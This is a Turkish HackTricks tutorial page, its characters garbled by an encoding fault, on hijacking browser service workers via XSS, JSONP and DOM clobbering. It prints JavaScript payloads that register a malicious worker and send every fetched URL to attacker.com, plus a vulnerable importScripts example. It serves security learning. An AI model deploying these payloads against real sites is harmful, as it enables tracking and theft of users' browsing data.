# Hizmet Ä°ÅŸÃ§ilerini KÃ¶tÃ¼ye Kullanma



<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> ile sÄ±fÄ±rdan kahramana kadar AWS hacklemeyi Ã¶ÄŸrenin!</summary>

* **Bir siber gÃ¼venlik ÅŸirketinde mi Ã§alÄ±ÅŸÄ±yorsunuz? Åirketinizin HackTricks'te reklamÄ±nÄ± gÃ¶rmek ister misiniz? ya da PEASS'Ä±n en son sÃ¼rÃ¼mÃ¼ne eriÅŸmek veya HackTricks'i PDF olarak indirmek ister misiniz? [ABONELÄ°K PLANLARI](https://github.com/sponsors/carlospolop)'na gÃ¶z atÄ±n!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) koleksiyonumuzu keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family)
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini alÄ±n**](https://peass.creator-spring.com)
* [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) **Discord grubuna** katÄ±lÄ±n veya [**telegram grubuna**](https://t.me/peass) veya beni **Twitter** ğŸ¦[**@carlospolopm**](https://twitter.com/hacktricks_live)** takip edin.**
* **Hacking pÃ¼f noktalarÄ±nÄ±zÄ± gÃ¶ndererek PR'ler gÃ¶ndererek** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **ve** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **ile paylaÅŸÄ±n.**

</details>

**Try Hard Security Group**

<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>

{% embed url="https://discord.gg/tryhardsecurity" %}

***

## Temel Bilgiler

**Hizmet iÅŸÃ§isi**, tarayÄ±cÄ±nÄ±z tarafÄ±ndan arka planda Ã§alÄ±ÅŸtÄ±rÄ±lan, herhangi bir web sayfasÄ±ndan baÄŸÄ±msÄ±z olarak Ã§alÄ±ÅŸan, bÃ¶ylece **Ã§evrimdÄ±ÅŸÄ± ve arka plan iÅŸleme** yeteneklerini artÄ±ran Ã¶zellikleri etkinleÅŸtiren bir betiktir. Hizmet iÅŸÃ§ileri hakkÄ±nda detaylÄ± bilgiye [buradan](https://developers.google.com/web/fundamentals/primers/service-workers) ulaÅŸÄ±labilir. SavunmasÄ±z bir web alanÄ± iÃ§inde hizmet iÅŸÃ§ilerini istismar ederek, saldÄ±rganlar, o alan iÃ§indeki tÃ¼m sayfalarla kurbanÄ±n etkileÅŸimini ele geÃ§irebilirler.


### Varolan Hizmet Ä°ÅŸÃ§ilerini Kontrol Etme

Varolan hizmet iÅŸÃ§ileri, **GeliÅŸtirici AraÃ§larÄ±**'ndaki **Uygulama** sekmesindeki **Hizmet Ä°ÅŸÃ§ileri** bÃ¶lÃ¼mÃ¼nde kontrol edilebilir. BaÅŸka bir yÃ¶ntem, daha detaylÄ± bir gÃ¶rÃ¼nÃ¼m iÃ§in [chrome://serviceworker-internals](https://chromium.googlesource.com/chromium/src/+/main/docs/security/chrome%3A/serviceworker-internals) adresini ziyaret etmektir.

### Ä°tme Bildirimleri

**Ä°tme bildirimi izinleri**, bir **hizmet iÅŸÃ§isinin** doÄŸrudan kullanÄ±cÄ± etkileÅŸimi olmadan sunucu ile iletiÅŸim kurma yeteneÄŸini etkiler. Ä°zinler reddedildiÄŸinde, sÃ¼rekli bir tehdit oluÅŸturma potansiyelini sÄ±nÄ±rlar. Tersine, izinler verildiÄŸinde, gÃ¼venlik riskleri artar ve potansiyel saldÄ±rÄ±larÄ± alÄ±p yÃ¼rÃ¼tme yeteneÄŸini etkinleÅŸtirir.

## Hizmet Ä°ÅŸÃ§isi OluÅŸturarak SaldÄ±rÄ±

Bu zafiyeti sÃ¶mÃ¼rmek iÃ§in ÅŸunlarÄ± bulmanÄ±z gerekir:

* Sunucuya **keyfi JS** dosyalarÄ± yÃ¼klemek iÃ§in bir yol ve yÃ¼klenen JS dosyasÄ±nÄ±n hizmet iÅŸÃ§isini yÃ¼klemek iÃ§in bir **XSS** bulun
* **ManipÃ¼le edebileceÄŸiniz (keyfi JS kodu ile)** savunmasÄ±z bir **JSONP isteÄŸi** ve bir **XSS** ile **JSONP'yi yÃ¼kleyen bir yÃ¼k** oluÅŸturacak bir **payload** ile **zararlÄ± bir hizmet iÅŸÃ§isi yÃ¼klemek** iÃ§in.

AÅŸaÄŸÄ±daki Ã¶rnekte, `fetch` etkinliÄŸini dinleyecek ve her alÄ±nan URL'yi saldÄ±rganÄ±n sunucusuna gÃ¶nderecek yeni bir hizmet iÅŸÃ§isi **kaydetmek** iÃ§in gereken kodu sunacaÄŸÄ±m:
```javascript
self.addEventListener('fetch', function(e) {
e.respondWith(caches.match(e.request).then(function(response) {
fetch('https://attacker.com/fetch_url/' + e.request.url)
});
```
Ve iÅŸte **iÅŸÃ§iyi kaydedecek olan kod** (uygulayabileceÄŸiniz **XSS**'i suiistimal ederek Ã§alÄ±ÅŸtÄ±rmanÄ±z gereken kod). Bu durumda, **saldÄ±rganÄ±n** sunucusuna bir **GET** isteÄŸi gÃ¶nderilecek ve hizmet iÅŸÃ§isinin kaydÄ±nÄ±n baÅŸarÄ±lÄ± olup olmadÄ±ÄŸÄ± **bildirilecek**:
```javascript
<script>
window.addEventListener('load', function() {
var sw = "/uploaded/ws_js.js";
navigator.serviceWorker.register(sw, {scope: '/'})
.then(function(registration) {
var xhttp2 = new XMLHttpRequest();
xhttp2.open("GET", "https://attacker.com/SW/success", true);
xhttp2.send();
}, function (err) {
var xhttp2 = new XMLHttpRequest();
xhttp2.open("GET", "https://attacker.com/SW/error", true);
xhttp2.send();
});
});
</script>
```
ZararlÄ± bir JSONP ucu sÃ¶z konusu olduÄŸunda deÄŸeri `var sw` iÃ§ine koymalÄ±sÄ±nÄ±z. Ã–rneÄŸin:
```javascript
var sw = "/jsonp?callback=onfetch=function(e){ e.respondWith(caches.match(e.request).then(function(response){ fetch('https://attacker.com/fetch_url/' + e.request.url) }) )}//";
```
**Service Worker** kÃ¶tÃ¼ye kullanmak iÃ§in Ã§ok yararlÄ± olacak olan [**Shadow Workers**](https://shadow-workers.github.io) adÄ±nda bir **C2** bulunmaktadÄ±r.

**24 saatlik Ã¶nbellek yÃ¶nergesi**, bir XSS gÃ¼venlik aÃ§Ä±ÄŸÄ± dÃ¼zeltmesinden sonra en fazla 24 saat boyunca kÃ¶tÃ¼ niyetli veya tehlikeli bir **hizmet iÅŸÃ§isinin (SW)** yaÅŸamÄ±nÄ± sÄ±nÄ±rlar, Ã§evrimiÃ§i istemci durumu varsayÄ±larak. ZayÄ±flÄ±ÄŸÄ± en aza indirmek iÃ§in site iÅŸletmecileri SW betiÄŸinin Zaman-CanlÄ±lÄ±ÄŸÄ± (TTL)'nÄ± dÃ¼ÅŸÃ¼rebilir. GeliÅŸtiricilere hÄ±zlÄ± devre dÄ±ÅŸÄ± bÄ±rakma iÃ§in bir [**hizmet iÅŸÃ§isi kill-switch**](https://stackoverflow.com/questions/33986976/how-can-i-remove-a-buggy-service-worker-or-implement-a-kill-switch/38980776#38980776) oluÅŸturmalarÄ± da tavsiye edilir.

## DOM Clobbering aracÄ±lÄ±ÄŸÄ±yla SW'de `importScripts`'in KÃ¶tÃ¼ye KullanÄ±mÄ±

Bir Hizmet Ä°ÅŸÃ§isinden Ã§aÄŸrÄ±lan **`importScripts`** iÅŸlevi, **farklÄ± bir etki alanÄ±ndan bir betiÄŸi iÃ§e aktarabilir**. Bu iÅŸlev, bir saldÄ±rganÄ±n **deÄŸiÅŸtirebileceÄŸi bir parametre** kullanÄ±larak Ã§aÄŸrÄ±ldÄ±ÄŸÄ±nda, saldÄ±rganÄ±n **kendi etki alanÄ±ndaki bir JS betiÄŸini iÃ§e aktarmasÄ±na** ve XSS almasÄ±na olanak tanÄ±r.

**Bu, CSP korumalarÄ±nÄ± bile atlar.**

**Ã–rnek zafiyetli kod:**

* **index.html**
```html
<script>
navigator.serviceWorker.register('/dom-invader/testcases/augmented-dom-import-scripts/sw.js' + location.search);
// attacker controls location.search
</script>
```
* **sw.js**
```javascript
const searchParams = new URLSearchParams(location.search);
let host = searchParams.get('host');
self.importScripts(host + "/sw_extra.js");
//host can be controllable by an attacker
```
### DOM Clobbering ile

DOM Clobbering hakkÄ±nda daha fazla bilgi iÃ§in ÅŸu baÄŸlantÄ±ya bakÄ±n:

{% content-ref url="dom-clobbering.md" %}
[dom-clobbering.md](dom-clobbering.md)
{% endcontent-ref %}

EÄŸer SW'nin **`importScripts`** Ã§aÄŸÄ±rdÄ±ÄŸÄ± URL/domain, **bir HTML Ã¶ÄŸesi iÃ§indeyse**, SW'nin **kendi alan adÄ±nÄ±zdan bir betik yÃ¼klemesini saÄŸlamak iÃ§in DOM Clobbering ile deÄŸiÅŸtirilebilir**.

Bu konunun Ã¶rneÄŸi iÃ§in referans baÄŸlantÄ±sÄ±na bakÄ±n.

## Referanslar

* [https://portswigger.net/research/hijacking-service-workers-via-dom-clobbering](https://portswigger.net/research/hijacking-service-workers-via-dom-clobbering)

**Try Hard Security Group**

<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>

{% embed url="https://discord.gg/tryhardsecurity" %}

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> ile sÄ±fÄ±rdan kahraman olmaya kadar AWS hackleme Ã¶ÄŸrenin!</summary>

* **Bir **cybersecurity ÅŸirketinde mi Ã§alÄ±ÅŸÄ±yorsunuz? Åirketinizin **HackTricks'te reklamÄ±nÄ± gÃ¶rmek ister misiniz**? ya da **PEASS'Ä±n en son sÃ¼rÃ¼mÃ¼ne eriÅŸmek veya HackTricks'i PDF olarak indirmek ister misiniz**? [**ABONELÄ°K PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini alÄ±n**](https://peass.creator-spring.com)
* **KatÄ±lÄ±n** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya beni **Twitter** ğŸ¦[**@carlospolopm**](https://twitter.com/hacktricks_live)**'da takip edin**.
* **Hacking pÃ¼f noktalarÄ±nÄ±zÄ± paylaÅŸarak PR'lar gÃ¶ndererek** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **ve** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **ile katkÄ±da bulunun**.

</details>
